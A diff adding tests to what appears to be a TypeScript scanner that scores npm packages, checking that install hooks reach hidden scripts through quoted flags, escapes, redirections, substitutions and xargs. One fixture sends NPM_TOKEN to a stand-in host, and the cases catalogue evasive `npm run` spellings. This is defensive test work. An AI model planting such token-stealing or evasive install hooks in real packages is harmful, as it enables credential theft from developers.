@@ -1,7 +1,7 @@
 // Ways a package with a clearly malicious pattern scored higher than the same pattern written another way: a payload
 // named like a document, an `npm run` with flags or quotes, an inline eval after other flags. Payloads are stand-ins.
 import { describe, expect, test } from "bun:test";
-import { analyze, expandHooks, finalize, gypCommands, isInlineDownload, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";
+import { analyze, expandHooks, finalize, gypCommands, isInlineDownload, shellWords, planLayers, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";
 
 function entry(path: string, text: string): TarEntry {
   const data = new TextEncoder().encode(text);
@@ -341,5 +341,453 @@ describe("the flags a command may carry are read in linear time", () => {
 
     expect(isInlineDownload(cmd)).toBe(false);
     expect(performance.now() - started).toBeLessThan(100);
+  });
+});
+
+describe("an install script's `npm run` is followed through quoted, escaped and value-taking flags", () => {
+  // npm 11.19.1 runs `payload` and its pre and post scripts for every spelling here (#16 review threads)
+  for (const cmd of [
+    "npm '--silent' run payload",
+    'npm run "-s" payload',
+    "npm run '-s' payload",
+    'npm run "--silent" payload',
+    'npm "--ignore-scripts" run payload',
+    "npm run \\payload",
+    'npm run ""payload',
+    "npm --prefix . run payload",
+    "npm run --prefix . payload",
+    "npm --loglevel warn run payload",
+  ]) {
+    test(`postinstall: ${cmd}`, () => {
+      const r = scoreOf({ scripts: { postinstall: cmd, payload: DROPPER } }, {});
+
+      expect(r.ids).toContain("install-download");
+      expect(r.score).toBeLessThan(SCORE_FLOOR);
+    });
+  }
+
+  for (const cmd of ["npm run 'a b'", "npm run --silent 'a b'", 'npm run "a b"']) {
+    test(`a quoted name with a space: ${cmd}`, () => {
+      const r = scoreOf({ scripts: { postinstall: cmd, "a b": DROPPER } }, {});
+
+      expect(r.ids).toContain("install-download");
+      expect(r.score).toBeLessThan(SCORE_FLOOR);
+    });
+  }
+
+  // a flag that takes a value swallows the --ignore-scripts after it, and xargs adds words apm cannot see, so npm may
+  // still run the pre and post scripts
+  for (const cmd of ["npm run --registry --ignore-scripts payload", "echo --no-ig | xargs npm run --ignore-scripts payload"]) {
+    test(`${cmd}: its pre and post scripts too`, () => {
+      const scripts = { postinstall: cmd, prepayload: "true", payload: "true", postpayload: DROPPER };
+
+      expect(expandHooks({ scripts })[0]?.scripts.toSorted()).toEqual(["postinstall", "prepayload", "payload", "postpayload"].toSorted());
+      expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
+    });
+  }
+
+  test("a script of many quoted runs is read in linear time", () => {
+    const cmd = "npm run '-s' payload; ".repeat(20_000);
+    const started = performance.now();
+
+    expect(expandHooks({ scripts: { postinstall: cmd, payload: "true" } })[0]?.scripts).toContain("payload");
+    expect(performance.now() - started).toBeLessThan(500);
+  });
+});
+
+
+describe("what only the flag-aware reading adds never displaces what main's reading reaches", () => {
+  test("a streamed plan with room for one file holds the direct install target, not one reached through a quoted flag", () => {
+    const enc = new TextEncoder();
+    const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
+    const body = "module.exports = 1;\n";
+    const manifest = { name: "probe-pkg", version: "1.0.0", scripts: { preinstall: "npm run '-s' setup", setup: "node lib/hidden.js", postinstall: "node direct.js" } };
+    const files = [file("lib/hidden.js", body), file("direct.js", body)];
+    const plan = planLayers({ manifest, files, imports: new Map(), budget: body.length });
+
+    expect([...plan.production]).toEqual(["direct.js"]);
+  });
+
+  test("an invocation only the shell reading finds runs pre and post scripts, though another runs the same script alone", () => {
+    const scripts = { postinstall: "npm run --ignore-scripts payload; npm run '-s' payload", prepayload: "true", payload: "true", postpayload: DROPPER };
+
+    expect(expandHooks({ scripts })[0]?.scripts).toContain("postpayload");
+  });
+
+  for (const cmd of ["echo --no-ig | /usr/bin/xargs npm run --ignore-scripts payload", "echo --no-ig |xargs npm run --ignore-scripts payload"]) {
+    test(`${cmd}: xargs by path or beside an operator is a doubt`, () => {
+      expect(expandHooks({ scripts: { postinstall: cmd, prepayload: "true", payload: "true", postpayload: DROPPER } })[0]?.scripts).toContain("postpayload");
+    });
+  }
+
+  for (const cmd of ["n''pm run payload", "\\npm run '-s' payload", 'npm run "\\payload"']) {
+    test(`a manager or name built by quotes or escapes: ${cmd}`, () => {
+      expect(expandHooks({ scripts: { postinstall: cmd, payload: DROPPER, "\\payload": DROPPER } })[0]?.scripts.some((s) => s.endsWith("payload"))).toBe(true);
+    });
+  }
+
+  test("a boolean node flag takes no value: a program's own arguments are not node's", () => {
+    const cmd = "node --no-warnings server.js -p 3000 https://example.invalid";
+
+    expect(isInlineDownload(cmd)).toBe(false);
+  });
+});
+
+
+describe("the flag-aware reading's additions, round two", () => {
+  test("a streamed plan with room for one file holds the declared entry, not a target reached through a quoted flag", () => {
+    const enc = new TextEncoder();
+    const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
+    const body = "module.exports = 1;\n";
+    const manifest = { name: "probe-pkg", version: "1.0.0", main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "node lib/hidden.js" } };
+    const plan = planLayers({ manifest, files: [file("lib/hidden.js", body), file("index.js", body)], imports: new Map(), budget: body.length });
+
+    expect([...plan.production]).toEqual(["index.js"]);
+  });
+
+  for (const [cmd, scripts] of [
+    ['npm run "pay\\\nload"', { payload: DROPPER }],
+    ["npm --prefix npm run payload", { payload: DROPPER }],
+  ] as const) {
+    test(`${JSON.stringify(cmd)}: the script npm runs is read`, () => {
+      expect(expandHooks({ scripts: { postinstall: cmd, ...scripts } })[0]?.scripts).toContain("payload");
+    });
+  }
+
+});
+
+
+describe("the shell reading is a third pass: it spends only what the first two leave", () => {
+  test("runs only the shell reading finds cannot use up the command budget before a run the flag-aware regex follows", () => {
+    const many = Array.from({ length: 220 }, (_, i) => `t${i}`);
+    const scripts = { ...Object.fromEntries(many.map((n) => [n, "true"])), postinstall: "npm run '-s' big && npm run -s x", big: many.map((n) => `npm run ${n}`).join(" && "), x: DROPPER };
+    const [hook] = expandHooks({ scripts });
+
+    expect(hook?.commands.map((c) => c.from)).toContain("scripts.x (run by scripts.postinstall)");
+    expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
+  });
+
+  test("a streamed plan still holds a target the flag-aware regex reaches, as before", () => {
+    const enc = new TextEncoder();
+    const body = "module.exports = 1;\n";
+    const file = (path: string): TarEntry => ({ path, size: enc.encode(body).length, mode: 0o644, data: enc.encode(body) });
+    const manifest = { name: "probe-pkg", version: "1.0.0", scripts: { postinstall: "npm run -s setup", setup: "node lib/hidden.js" } };
+
+    expect([...planLayers({ manifest, files: [file("lib/hidden.js"), file("index.js")], imports: new Map(), budget: body.length }).production]).toEqual(["lib/hidden.js"]);
+  });
+
+  test("a run inside a double-quoted command substitution is read", () => {
+    expect(expandHooks({ scripts: { postinstall: 'echo "$(npm run \'-s\' payload)"', payload: DROPPER } })[0]?.scripts).toContain("payload");
+    expect(expandHooks({ scripts: { postinstall: 'echo "`npm run \'-s\' payload`"', payload: DROPPER } })[0]?.scripts).toContain("payload");
+  });
+
+  test("an extensionless program after a boolean node flag is the program, and its arguments are its own", () => {
+    expect(isInlineDownload("node --no-warnings bin/run -e https://example.invalid")).toBe(false);
+  });
+});
+
+
+describe("the third pass never costs what fe2e641 read", () => {
+  test("pass 2 keeps fe2e641's ignore-scripts reading: a stricter doubt follows pre and post scripts only in pass 3", () => {
+    const many = Array.from({ length: 220 }, (_, i) => `t${i}`);
+    const scripts = { ...Object.fromEntries(many.map((n) => [n, "true"])), postinstall: "npm run --unknown-arity --ignore-scripts a && npm run -s b", a: "true", prea: many.map((n) => `npm run ${n}`).join(" && "), b: DROPPER };
+    const [hook] = expandHooks({ scripts });
+
+    expect(hook?.commands.map((c) => c.from)).toContain("scripts.b (run by scripts.postinstall)");
+    expect(hook?.scripts).toContain("prea");
+  });
+
+  test("an in-memory read with room for the entry and its import reads those before a target only the shell reading finds", () => {
+    const enc = new TextEncoder();
+    const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
+    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "node lib/setup.js" } };
+    const pj = file("package.json", JSON.stringify(manifest));
+    const index = file("index.js", "require('./helper.js');\n");
+    const helper = file("helper.js", "require('https').get('https://example.invalid/?t=' + process.env.NPM_TOKEN);\n");
+    const setup = file("lib/setup.js", "1;\n");
+    const a = analyze({ name: "probe-pkg", manifest, files: [pj, index, helper, setup], publisher: "a", previousPublishers: [], maxScannedBytes: pj.size + index.size + helper.size });
+    const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });
+
+    expect(r.signals.flatMap((s) => s.evidence).some((e) => e.startsWith("helper.js:"))).toBe(true);
+  });
+
+  test("a group inside a double-quoted substitution does not end it", () => {
+    expect(expandHooks({ scripts: { postinstall: 'echo "$( (true); npm run \'-s\' payload)"', payload: DROPPER } })[0]?.scripts).toContain("payload");
+  });
+});
+
+
+describe("the third pass's targets wait for fe2e641's whole reading plan", () => {
+  const enc = new TextEncoder();
+  const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
+
+  test("an in-memory read with room for the entry and its import stays complete", () => {
+    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "node lib/setup.js" } };
+    const pj = file("package.json", JSON.stringify(manifest));
+    const index = file("index.js", "require('./helper.js');\n");
+    const helper = file("helper.js", "module.exports = 2;\n".repeat(4));
+    const setup = file("lib/setup.js", "1;\n");
+    const a = analyze({ name: "probe-pkg", manifest, files: [pj, index, helper, setup], publisher: "a", previousPublishers: [], maxScannedBytes: pj.size + index.size + helper.size });
+    const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });
+
+    expect(r.coverage).toMatchObject({ kind: "complete" });
+  });
+
+  test("a streamed plan's second layer holds a direct target before one only the shell reading reaches", () => {
+    const body = "\u007fELF native\n";
+    const manifest = { name: "probe-pkg", version: "1.0.0", scripts: { preinstall: "npm run '-s' alt", alt: "./alt-setup.so", postinstall: "./baseline.so" } };
+    const plan = planLayers({ manifest, files: [file("alt-setup.so", body), file("baseline.so", body)], imports: new Map(), budget: enc.encode(body).length });
+
+    expect([...plan.production, ...plan.extra]).toEqual(["baseline.so"]);
+  });
+});
+
+
+describe("redirections and the third pass's own work meter", () => {
+  for (const cmd of ["npm run 2>/dev/null 'payload'", "npm run > log '-s' payload", "npm run -s >>log 2>&1 \"payload\""]) {
+    test(`a redirection before the name: ${cmd}`, () => {
+      expect(expandHooks({ scripts: { postinstall: cmd, payload: DROPPER, log: "true", "1": "true" } })[0]?.scripts).toContain("payload");
+    });
+  }
+
+  test("the shell reading spends none of the analysis's work: a tight work limit reads as it did", () => {
+    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: "run-s build:*", "build:a": "true", "build:b": "true" } };
+    const enc = new TextEncoder();
+    const pj = { path: "package.json", size: enc.encode(JSON.stringify(manifest)).length, mode: 0o644, data: enc.encode(JSON.stringify(manifest)) };
+    const state = { publishedAt: 0, now: 1e12, deprecated: null, status: "active" as const, statusReason: null };
+    const ample = finalize(analyze({ name: "probe-pkg", manifest, files: [pj], publisher: "a", previousPublishers: [] }), state);
+    const work = analyze({ name: "probe-pkg", manifest, files: [pj], publisher: "a", previousPublishers: [], maxWork: 270 });
+
+    expect(finalize(work, state).score).toBe(ample.score);
+  });
+});
+
+
+describe("what the third pass reaches is read on a meter of its own", () => {
+  const enc = new TextEncoder();
+  const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
+  const state = { publishedAt: 0, now: 1e12, deprecated: null, status: "active" as const, statusReason: null };
+
+  test("a chained target only the shell reading finds costs the analysis nothing at fe2e641's work limit", () => {
+    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "node setup.txt" } };
+    const files = [file("package.json", JSON.stringify(manifest)), file("index.js", "module.exports = 1;\n"), file("setup.txt", "console.log('setting up');\n".repeat(30))];
+    const ample = finalize(analyze({ name: "probe-pkg", manifest, files, publisher: "a", previousPublishers: [] }), state);
+
+    expect(finalize(analyze({ name: "probe-pkg", manifest, files, publisher: "a", previousPublishers: [], maxWork: 700 }), state).score).toBe(ample.score);
+  });
+
+  test("a quoted number before a redirection is the script's name, not a file descriptor", () => {
+    expect(expandHooks({ scripts: { postinstall: "npm run '7'>log", "7": DROPPER, log: "true" } })[0]?.scripts).toContain("7");
+  });
+});
+
+describe("the shell reading follows only what npm runs", () => {
+  test("a manager's name in another command's arguments is an argument", () => {
+    const r = scoreOf({ scripts: { postinstall: "echo 'npm' run docs", docs: DROPPER } }, {});
+
+    expect(r.ids).not.toContain("install-download");
+  });
+
+  test("a quoted run first in a later simple command is still read", () => {
+    for (const postinstall of ["true && 'npm' run docs", "echo hi; npm run '-s' docs"]) {
+      expect(scoreOf({ scripts: { postinstall, docs: DROPPER } }, {}).ids).toContain("install-download");
+    }
+  });
+
+  test("npm's boolean flags and a quoted --ignore-scripts keep the run alone", () => {
+    for (const postinstall of ["npm run --silent --ignore-scripts setup", "npm run '--ignore-scripts' setup", "npm run -s '--ignore-scripts' setup"]) {
+      expect(scoreOf({ scripts: { postinstall, presetup: DROPPER, setup: "echo setup" } }, {}).ids).not.toContain("install-download");
+    }
+  });
+
+  test("words after the name, or xargs before npm, leave the run to the first two readings", () => {
+    for (const postinstall of ["npm run '--ignore-scripts' setup '--no-ignore-scripts'", "npm run '--ignore-scripts' setup --ignore-scripts false", "echo x | xargs npm run '--ignore-scripts' setup"]) {
+      expect(expandHooks({ scripts: { postinstall, presetup: DROPPER, setup: "echo setup" } })[0]?.addedScripts).toEqual([]);
+    }
+  });
+
+  test("a long chain only the shell reading finds is not cut by the nesting limit", () => {
+    const steps = Object.fromEntries(Array.from({ length: 9 }, (_, i) => [`step${i}`, `npm run '-s' step${i + 1}`]));
+    const scripts = { ...steps, postinstall: "npm run '-s' step0", step9: "echo setup" };
+    const benign = scoreOf({ scripts }, {});
+    const dropper = scoreOf({ scripts: { ...scripts, step9: DROPPER } }, {});
+
+    expect(benign.ids).not.toContain("incomplete");
+    expect(benign.score).toBeGreaterThanOrEqual(SCORE_FLOOR);
+    expect(dropper.ids).toContain("install-download");
+  });
+});
+
+describe("the shell reading keeps the shell's command boundaries and npm's options", () => {
+  const benign = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("a manager's name after npm's own arguments, in a comment, after `command -v` or after a substitution in a word is an argument", () => {
+    for (const postinstall of ["npm run setup 'npm' run docs", "command -v 'npm' run docs || true", "echo setup # documentation; 'npm' run docs", 'echo "$(true)npm" run docs']) {
+      expect(benign({ postinstall, setup: "echo setup", docs: DROPPER })).not.toContain("install-download");
+    }
+  });
+
+  test("a run inside a substitution, after a comment's line or after an assignment from a substitution is read", () => {
+    for (const postinstall of ["echo $('npm' run docs)", "echo hi # note\n'npm' run docs", "x=$(true); 'npm' run docs"]) {
+      expect(benign({ postinstall, docs: DROPPER })).toContain("install-download");
+    }
+  });
+
+  test("npm's value flags take their value, so neither the value nor what it hides reads as a script", () => {
+    expect(benign({ postinstall: "npm run --loglevel=silent --ignore-scripts setup", presetup: DROPPER, setup: "echo setup" })).not.toContain("install-download");
+    expect(benign({ postinstall: "npm run '--loglevel' 'silent' setup", silent: DROPPER, setup: "echo setup" })).not.toContain("install-download");
+  });
+
+  test("the shell reading's own limits stop it without marking the hook incomplete", () => {
+    const steps = Object.fromEntries(Array.from({ length: 200 }, (_, i) => [`step${i}`, "echo setup"]));
+    const r = scoreOf({ scripts: { ...steps, postinstall: Array.from({ length: 200 }, (_, i) => `npm run '-s' step${i}`).join("; ") } }, {});
+
+    expect(r.ids).not.toContain("incomplete");
+    expect(r.score).toBeGreaterThanOrEqual(SCORE_FLOOR);
+  });
+});
+
+describe("the shell reading's doubts stay within the invocation, and built words are not commands", () => {
+  const ids = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("what follows a `--` after the name, or another command's expansion, keeps --ignore-scripts", () => {
+    for (const postinstall of ["npm run '--ignore-scripts' setup -- --no-ignore-scripts", "npm run '--ignore-scripts' setup; echo \"$PWD\""]) {
+      expect(ids({ postinstall, presetup: DROPPER, setup: "echo setup" })).not.toContain("install-download");
+    }
+  });
+
+  test("a word built from a substitution, or a wrapper option that exits, runs no manager", () => {
+    for (const postinstall of ["safenpm() { echo safe; }; \"$(printf safe)npm\" run docs", "env --help 'npm' run docs"]) {
+      expect(ids({ postinstall, docs: DROPPER })).not.toContain("install-download");
+    }
+  });
+
+  test("a run inside a quoted substitution is still read", () => {
+    expect(ids({ postinstall: "echo \"$('npm' run docs)\"", docs: DROPPER })).toContain("install-download");
+  });
+});
+
+describe("npm's boolean and directory flags in the shell reading", () => {
+  const ids = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("a boolean flag takes no value, so --ignore-scripts holds and the word after the name is an argument", () => {
+    expect(ids({ postinstall: "npm run '--ignore-scripts' '--color' check", check: "echo check", precheck: DROPPER })).not.toContain("install-download");
+    expect(ids({ postinstall: "npm run '--no-color' check report", check: "echo check", report: DROPPER })).not.toContain("install-download");
+  });
+
+  test("--prefix to another directory runs that package's scripts, and to the package's own runs these", () => {
+    for (const postinstall of ["npm '--prefix' tools run check", "npm '--prefix=tools' run check"]) expect(ids({ postinstall, check: DROPPER })).not.toContain("install-download");
+
+    expect(ids({ postinstall: "npm '--prefix' . run check", check: DROPPER })).toContain("install-download");
+  });
+});
+
+describe("the shell reading follows only what it can tell npm runs", () => {
+  const ids = (scripts: Record<string, string>, extra = {}) => scoreOf({ ...extra, scripts }, {}).ids;
+
+  test("a true or false after a flag, or a value after an option the tables do not list, may be the name: nothing is followed", () => {
+    expect(ids({ postinstall: "npm run '-s' true check", true: "echo", check: DROPPER })).not.toContain("install-download");
+    expect(ids({ postinstall: "npm --loglevel warn run '--fetch-retries' 0 check", 0: DROPPER, check: "echo" })).not.toContain("install-download");
+  });
+
+  test("a workspace, or a --prefix after the name, runs another package's scripts", () => {
+    expect(ids({ postinstall: "npm '--workspace' tools run check", check: DROPPER }, { workspaces: ["tools"] })).not.toContain("install-download");
+    expect(ids({ postinstall: "npm run --loglevel warn check '--prefix' tools", check: DROPPER })).not.toContain("install-download");
+  });
+});
+
+describe("the shell reading leaves npm's run to the first two readings where npm's config or mode is not the text", () => {
+  const ids = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("env -C, npm's config in the environment and --help before or after the name follow nothing", () => {
+    expect(ids({ postinstall: "env -C tools npm '--loglevel' warn run check", check: DROPPER })).not.toContain("install-download");
+    expect(ids({ postinstall: "npm_config_ignore_scripts=true npm run '--loglevel' warn check", check: "echo", precheck: DROPPER })).not.toContain("install-download");
+
+    for (const postinstall of ["npm run --loglevel warn check '--help'", "npm run '--help' check"]) expect(ids({ postinstall, check: DROPPER })).not.toContain("install-download");
+  });
+});
+
+describe("the shell reading leaves a moved shell and heredocs to the first two readings, and reads npm's options to the end", () => {
+  const ids = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("after a cd, or in a heredoc's body, no run is read", () => {
+    expect(ids({ postinstall: "cd tools && npm '--loglevel' warn run check", check: DROPPER })).not.toContain("install-download");
+    expect(ids({ postinstall: "cat <<DOC\nnpm --loglevel warn run check\nDOC", check: DROPPER })).not.toContain("install-download");
+  });
+
+  test("--ignore-scripts after the name follows nothing", () => {
+    expect(ids({ postinstall: "npm run --loglevel warn check '--ignore-scripts'", check: "echo", precheck: DROPPER })).not.toContain("install-download");
+  });
+});
+
+describe("the shell reading reads npm's whole option vector before following a run", () => {
+  const ids = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("a true after --ignore-scripts, a -- before run, an exported npm config or a config file follow nothing", () => {
+    expect(ids({ postinstall: "npm --loglevel warn run '--ignore-scripts' true check", true: DROPPER, check: "echo" })).not.toContain("install-download");
+    expect(ids({ postinstall: "npm -- run '--loglevel' warn check", "--loglevel": "echo", check: DROPPER })).not.toContain("install-download");
+    expect(ids({ postinstall: "export npm_config_ignore_scripts=true; npm run '--loglevel' warn check", precheck: DROPPER, check: "echo" })).not.toContain("install-download");
+    expect(ids({ postinstall: "npm '--userconfig' ./check.ini --loglevel warn run check", precheck: DROPPER, check: "echo" })).not.toContain("install-download");
+  });
+
+  test("a quoted --ignore-scripts before the name still runs the named script", () => {
+    expect(ids({ postinstall: "npm run '--ignore-scripts' check", check: DROPPER })).toContain("install-download");
+  });
+});
+
+describe("words that only look like npm's or node's options", () => {
+  const ids = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("an argument after the name follows nothing", () => {
+    expect(ids({ postinstall: "npm run --loglevel warn check '--ignore-scripts' false-positive", check: "echo", precheck: DROPPER })).not.toContain("install-download");
+  });
+
+  test("xargs -I replaces npm's words, so nothing is followed", () => {
+    expect(ids({ postinstall: "printf ready | xargs -I TARGET npm '--loglevel' warn run TARGET", TARGET: DROPPER, ready: "echo" })).not.toContain("install-download");
+  });
+
+});
+
+describe("words npm or node may not read as written", () => {
+  const ids = (scripts: Record<string, string>) => scoreOf({ scripts }, {}).ids;
+
+  test("a true after --ignore-scripts and a glob the shell expands are not script names", () => {
+    expect(ids({ postinstall: "npm --loglevel warn run '--ignore-scripts' true", true: DROPPER })).not.toContain("install-download");
+    expect(ids({ postinstall: "npm '--loglevel' warn run report*", "report-ready": "echo", "report*": DROPPER })).not.toContain("install-download");
+  });
+
+  test("node exits at --version after the eval code too", () => {
+    expect(isInlineDownload("node '--title' fetch -e 'console.log(12345)' --version")).toBe(false);
+  });
+});
+
+describe("node's exit flags never cost what fe2e641's eval reading finds", () => {
+  test("an eval fe2e641 reads stands, and an exit flag inside the eval code is code", () => {
+    expect(isInlineDownload("node '-e' 'fetch(\"data:,inline --help marker\").then(r=>r.text())'")).toBe(true);
+    expect(isInlineDownload("node --version -e \"require('https').get('https://example.invalid/x')\"")).toBe(true);
+  });
+});
+
+describe("the shell words of deeply nested substitutions", () => {
+  test("past the nesting limit nothing more is read, so the stacks stay small", () => {
+    let tokens = 0;
+
+    for (const _ of shellWords("$(".repeat(100_000))) tokens++;
+
+    expect(tokens).toBeLessThan(200);
+  });
+});
+
+describe("a command cut by the nesting limit", () => {
+  test("is unfinished, so no run is read from it", () => {
+    const postinstall = "( ".repeat(64) + 'npm --loglevel warn run check "--help"' + " )".repeat(64);
+
+    expect(expandHooks({ scripts: { postinstall, check: DROPPER } })[0]?.addedScripts).toEqual([]);
+  });
+});
+
+describe("after -- the last word is the script's name", () => {
+  test("a script named like an option is followed", () => {
+    expect(scoreOf({ scripts: { postinstall: "npm run '-s' -- '--silent'", "--silent": DROPPER } }, {}).ids).toContain("install-download");
   });
 });
